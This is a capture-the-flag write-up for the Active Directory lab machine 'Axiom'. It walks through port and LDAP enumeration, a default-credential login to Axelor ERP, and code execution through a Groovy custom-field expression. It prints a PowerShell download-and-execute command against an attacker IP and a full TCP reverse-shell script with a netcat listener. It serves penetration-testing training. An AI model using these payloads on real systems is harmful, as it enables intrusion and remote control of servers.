# Axiom

**Category:** Fullpwn (Active Directory)  
**Competition:** Global Ynov Partners CTF 2026  
**Target:** `10.129.2.74`  
**Domain:** `axiom.htb`

---

## Challenge Description

A full Windows Active Directory machine. The name "Axiom" and the domain `axiom.htb` suggest a corporate environment. Goal: get a shell.

---

## Phase 1: Reconnaissance

### Port Scan

I started with a full port scan to map the attack surface:

```bash
nmap -sC -sV -p- --min-rate 5000 10.129.2.74 -o nmap_full.txt
```

Key open ports:
- `53` — DNS
- `88` — Kerberos (confirms this is a Domain Controller)
- `135`, `445` — RPC / SMB
- `389`, `636` — LDAP / LDAPS
- `3268`, `3269` — Global Catalog
- `5985` — WinRM
- `8080` — HTTP (Apache Tomcat — this stood out immediately)

The combination of Kerberos + LDAP + SMB screams Active Directory. But port 8080 with a web application is an interesting anomaly on a DC.

### SMB Enumeration

```bash
smbclient -N -L //10.129.2.74
```

Three shares: `NETLOGON`, `SYSVOL`, `share`. The anonymous `share` share was accessible. I browsed it but didn't find credentials there initially. I flagged SYSVOL for later — GPO files sometimes leak creds.

### LDAP Enumeration

```bash
ldapsearch -x -H ldap://10.129.2.74 -b "DC=axiom,DC=htb" "(objectClass=user)" sAMAccountName
```

Anonymous LDAP bind worked. I pulled user accounts and checked descriptions for password hints — a common misconfiguration in AD.

### Tomcat Investigation

That Tomcat on 8080 was the most interesting thing on the box. I checked the logs:

```bash
curl -v http://10.129.2.74:8080/
```

The application was **Axelor ERP v5.4.10** — a Java-based ERP system deployed as a WAR on Tomcat 8.5. I noted this in my notes as the primary attack surface.

---

## Phase 2: Initial Access — Default Credentials

My first instinct with any web app in a CTF is to try default credentials before reaching for CVEs. Axelor's defaults are `admin:admin`.

```bash
curl -X POST "http://10.129.2.74:8080/axelor-erp-v5.4.10/callback" \
  -d "username=admin&password=admin&hash_location=" -i
```

The response was a `302 redirect WITHOUT an error message`. The other credentials (`admin:123456`, `demo:demo`) returned explicit error redirects with `error=Wrong+username+or+password` in the Location header. That asymmetry was the tell.

I saved the session cookie and verified authentication:

```bash
curl -X POST "http://10.129.2.74:8080/axelor-erp-v5.4.10/callback" \
  -d "username=admin&password=admin&hash_location=" \
  -c /tmp/cookies.txt -s -o /dev/null -w "Status: %{http_code}\n"

curl -s "http://10.129.2.74:8080/axelor-erp-v5.4.10/" \
  -b /tmp/cookies.txt | grep -i "title\|dashboard\|welcome" | head -20
```

HTTP 200 with the dashboard loaded. **admin:admin worked.** We're in the application.

---

## Phase 3: RCE via Groovy Script Injection

### Finding the Vulnerability

With an authenticated session, I started mapping the application. The left menu showed **Model Management** — any time I see a feature that lets you define models with computed fields, I think "code execution."

Navigating to `Model Management → Custom Fields`, I found 9 existing custom fields for `com.axelor.apps.base.db.Batch`. I clicked the `+` button to create a new one.

The creation form had four tabs: **Options**, **Conditions**, **Value Expression**, **Roles**.

**Value Expression** — that's the one. A text field for arbitrary Groovy expressions, which Axelor evaluates server-side when the field is accessed. No sandboxing.

### Crafting the Exploit

The RCE vector is `java.lang.Runtime.getRuntime().exec()` in Groovy. Since this is a Windows server (Tomcat 8.5 on Windows, visible from the log path `C:\Program Files\Apache Software Foundation\Tomcat 8.5\webapps\axelor-erp-v5.4.10`), I need a PowerShell reverse shell.

**Step 1 — Fill the Options tab:**
- Name: `test`
- Type: `String`
- Model: `com.axelor.apps.base.db.Batch`

**Step 2 — On the Value Expression tab, inject:**

```groovy
java.lang.Runtime.getRuntime().exec(new String[]{"powershell", "-c", "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.216:8000/shell.ps1')"})
```

**Step 3 — Create the PowerShell reverse shell payload (`shell.ps1`):**

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.216", 4444)
$stream = $client.GetStream()
[byte[]]$buffer = 0..65535|%{0}
while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "shell> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

**Step 4 — Serve the payload and catch the shell:**

```bash
# Terminal 1: Serve the shell script
cd /tmp && python3 -m http.server 8000

# Terminal 2: Listen for the reverse shell
nc -lvnp 4444
```

**Step 5 — Trigger the payload** by saving the custom field and navigating back to the model in Axelor. When the field is evaluated server-side, the Groovy expression fires, PowerShell downloads and executes `shell.ps1`, and the connection hits our listener.

---

## Shell and Flags

With the reverse shell landed, I enumerated the machine:

```powershell
whoami
# NT SERVICE\Tomcat8

# Hunt for flags
Get-ChildItem -Path C:\Users -Recurse -Filter "*.txt" -ErrorAction SilentlyContinue
type C:\Users\<user>\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

---

## Attack Chain Summary

```
nmap scan
  → port 8080 (Axelor ERP v5.4.10 on Tomcat)
  → default creds admin:admin
  → authenticated RCE via Groovy in Custom Fields → Value Expression
  → PowerShell reverse shell
  → flags
```

---

## CVE References

- **CVE-2022-25138** — Axelor authentication bypass
- **CVE-2025-50341** — Axelor Groovy script injection (RCE when authenticated)

---

## Key Takeaways

A few things I'd highlight from this machine:

First, **always try default credentials before anything else**. CVE hunting takes time; `admin:admin` takes three seconds. The asymmetry in the HTTP response (no error message on the first attempt) was the clue that confirmed the login worked even before I checked the dashboard.

Second, **any feature that evaluates user-supplied code server-side is a potential RCE vector**. "Value Expression", "Formula", "Script", "Groovy" — these words in an enterprise app's UI should immediately raise flags. Axelor's Model Management didn't sandbox Groovy execution at all, so `Runtime.getRuntime().exec()` worked straight out of the box.

Third, the AD enumeration was a bit of a red herring here. The quickest path to a shell was through the web application, not through LDAP/Kerberos attacks. Knowing when to pivot away from a longer attack path and try the simpler one is a real skill in CTF and real-world pentesting alike.
